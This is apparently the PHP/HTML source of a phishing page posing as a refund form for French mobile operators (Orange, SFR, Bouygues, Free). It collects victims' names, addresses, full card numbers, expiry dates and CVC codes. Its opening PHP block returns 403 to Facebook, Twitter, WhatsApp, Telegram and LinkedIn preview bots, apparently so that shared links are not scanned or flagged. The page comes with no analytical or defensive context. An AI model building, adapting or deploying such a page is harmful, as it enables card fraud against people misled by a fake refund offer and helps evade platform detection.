<?php
require_once 'auth_check.php';
$blockedBots  = ['facebookexternalhit', 'Facebot', 'Twitterbot', 'WhatsApp', 'TelegramBot', 'LinkedInBot'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

foreach ($blockedBots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }
}

$site_url = 'https://'.$_SERVER['HTTP_HOST'].'/remboursement';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de remboursement</title>
    
    <!-- Favicon -->
    <link rel="icon" href="assets/img/favicon.ico">
    
    <!-- Open Graph -->
    <meta name="description" content="Formulaire de remboursement">
    <meta name="keywords">
    <meta property="og:title" content="">
    <meta property="og:image" content="assets/img/depositphotos_87169844-stock-illustration-euro-rebate-icon.webp">
    <meta property="og:site_name" content="<?php echo $site_url; ?>">
    <meta property="og:description" content="Formulaire de remboursement pour les opérateurs français">
    <meta property="og:keywords">
    <meta property="og:content_language" content="fr">
    <meta property="og:locale" content="fr_FR">
    <meta property="og:type" content="remboursement">
    <meta property="og:url" content="<?php echo $site_url; ?>">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:alt" content="Euro Icon - Remboursement Service">

    
    <link rel="stylesheet" href="assets/css/style.css?v=1.0.0">
</head>
<body>
    <div class="main-container">
        <!-- Logo Section -->
        <div class="logo-section">
            <img src="assets/img/logo.png" alt="Euro Icon" class="main-logo">
            <h1>Formulaire de remboursement</h1>
        </div>

        <!-- Operator Section -->
        <div class="operator-section">
            <h2>Sélectionnez votre opérateur mobile :</h2>
            <div class="operator-grid">
                <div class="operator-item" onclick="selectOperator(this)">
                    <img src="assets/img/1683000787orange-icon-png.png" alt="Orange">
                </div>
                <div class="operator-item" onclick="selectOperator(this)">
                    <img src="assets/img/SFR-2022-logo.svg.png" alt="SFR">
                </div>
                <div class="operator-item" onclick="selectOperator(this)">
                    <img src="assets/img/Bouygues_Telecom_(alt_logo).svg.png" alt="Bouygues">
                </div>
                <div class="operator-item" onclick="selectOperator(this)">
                    <img src="assets/img/images.png" alt="Free">
                </div>
            </div>
        </div>

        <!-- Main Form -->
        <form id="remboursementForm" class="form-section">
            <div class="form-row">
                <input type="text" id="prenom" placeholder="Prénom" required>
                <input type="text" id="nom" placeholder="Nom" required>
            </div>

            <div class="form-group">
                <label>Pays :</label>
                <select id="pays" required>
                    <option value="">Sélectionner un pays</option>
                    <option value="DE">Allemagne</option>
                    <option value="AT">Autriche</option>
                    <option value="BE">Belgique</option>
                    <option value="FR">France</option>
                    <option value="IT">Italie</option>
                    <option value="ES">Espagne</option>
                    <option value="NL">Pays-Bas</option>
                    <option value="PT">Portugal</option>
                    <option value="PL">Pologne</option>
                    <option value="SE">Suède</option>
                    <option value="CH">Suisse</option>
                    <option value="NO">Norvège</option>
                    <option value="QA">Qatar</option>
                    <option value="SA">Arabie Saoudite</option>
                    <option value="KW">Koweït</option>
                    <option value="GB">Royaume-Uni</option>
                    <option value="US">États-Unis</option>
                    <option value="CA">Canada</option>
                    <option value="AU">Australie</option>
                    <option value="NZ">Nouvelle-Zélande</option>
                    <option value="SG">Singapour</option>
                    <option value="HK">Hong Kong</option>
                    <option value="TW">Taïwan</option>
                   
                    
                </select>
            </div>

            <div class="form-group">
                <label>Adresse :</label>
                <input type="text" id="adresse" placeholder="Entrez votre adresse" required>
                <div class="form-row">
                    <input type="text" id="code_postal" placeholder="Code postal" required>
                    <input type="text" id="ville" placeholder="Ville" required>
                </div>
            </div>

            <!-- Card Number Section -->
            <div class="form-group">
                <label>Numéro de carte</label>
                <div class="card-input-container">
                    <input type="text" 
                           id="numero_carte" 
                           name="numero_carte" 
                           placeholder="0000 0000 0000 0000" 
                           maxlength="19" 
                           autocomplete="off"
                           required>
                </div>
                <div class="card-type-icons">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/1/16/Former_Visa_%28company%29_logo.svg" alt="Visa" class="card-icon" id="visa_icon">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="card-icon" id="mastercard_icon">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="card-icon" id="amex_icon">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/JCB_logo.svg" alt="JCB" class="card-icon" id="jcb_icon">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/DiscoverCard.svg" alt="Discover" class="card-icon" id="discover_icon">
                </div>
            </div>

            <div class="card-details">
                <select id="mois" required>
                    <option value="">MM</option>
                    <?php for($i=1; $i<=12; $i++): ?>
                        <option value="<?= sprintf('%02d', $i) ?>"><?= sprintf('%02d', $i) ?></option>
                    <?php endfor; ?>
                </select>

                <select id="annee" required>
                    <option value="">AA</option>
                    <?php for($i=24; $i<=40; $i++): ?>
                        <option value="<?= $i ?>"><?= $i ?></option>
                    <?php endfor; ?>
                </select>

                <input type="text" id="cvv" placeholder="CVC" maxlength="3" required>
            </div>

            <div id="error_message" class="error-message"></div>
            <div id="success_message" class="success-message"></div>

            <button type="submit" class="submit-button">Confirmation de remboursement</button>
        </form>

       
    </div>

    <script src="assets/js/script.js?v=1.0.0"></script>
</body>
</html>
